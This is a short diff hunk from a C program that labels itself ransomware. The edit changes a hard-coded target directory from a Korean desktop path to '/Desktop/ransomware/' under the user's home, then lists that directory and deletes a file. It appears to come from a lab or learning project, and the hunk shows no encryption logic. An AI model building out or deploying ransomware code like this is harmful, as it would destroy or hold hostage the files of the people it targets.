@@ -28,7 +28,7 @@ char dede[] = {"RANSOMEWARE_INFO"};
     start_path = (char*) malloc(strlen(home)+strlen(lpwd->pw_name)+strlen("/Desktop/ransomware/")+2);
     strcpy(start_path, home);    
     strcat(start_path, lpwd->pw_name);
-    strcat(start_path, "/바탕화면/tlsgur/");
+    strcat(start_path, "/Desktop/ransomware/");
     printf("%s", start_path);
         ls_dir(start_path);
 remove(dede);
